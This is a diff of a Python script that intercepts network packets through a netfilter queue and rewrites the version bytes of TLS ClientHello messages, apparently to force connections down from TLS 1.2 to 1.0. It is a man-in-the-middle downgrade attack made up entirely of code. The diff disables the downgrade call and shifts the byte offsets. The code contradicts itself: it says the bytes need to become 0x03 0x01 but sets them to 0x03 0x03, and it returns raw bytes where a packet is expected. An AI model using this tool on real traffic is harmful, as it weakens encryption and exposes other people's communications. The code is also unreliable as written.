@@ -33,7 +33,6 @@ def processPacket(packet):
   else:
     tcpPayload = scapy_packet["Raw"].load
 
-    # Adjusted the matching rules for Python 2 and old Scapy.
     if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
       print("TLS handshake found, client HELLO.")
 
@@ -41,8 +40,8 @@ def processPacket(packet):
         print("TLS v1.2, dropping down to v1.0")
         print(scapy_packet.command())
 
-        scapy_packet = downgradeTLS(scapy_packet)
-             
+        #scapy_packet = downgradeTLS(scapy_packet)
+        
         # set back as netfilter queue packet
         packet.set_payload(bytes(scapy_packet))      
         
@@ -58,16 +57,16 @@ def downgradeTLS(scapy_packet):
   del scapy_packet["IP"].chksum
   del scapy_packet["TCP"].chksum
 
-  rawPayload = [b for b in scapy_packet["Raw"].load]
-  print("Position [9][10] was: ", rawPayload[9], rawPayload[10], ". Needs to change to 0x03 0x01.")
+  rawBytes = [b for b in scapy_packet]
+  print("Position [61][62] was: ", rawBytes[61], rawBytes[62], ". Needs to change to 0x03 0x01.")
 
-  rawPayload[9] = '\x03'
-  rawPayload[10] = '\x03'
+  rawBytes[61] = '\x03'
+  rawBytes[62] = '\x03'
 
-  print("Position [9][10] is now: ", rawPayload[9], rawPayload[10], ".")
+  print("Position [61][62] is now: ", rawBytes[61], rawBytes[62], ".")
   
-  payload = b''.join(rawPayload)
-  return payload
+  scapy_packet = b''.join(rawBytes)
+  return scapy_packet
 
 
 
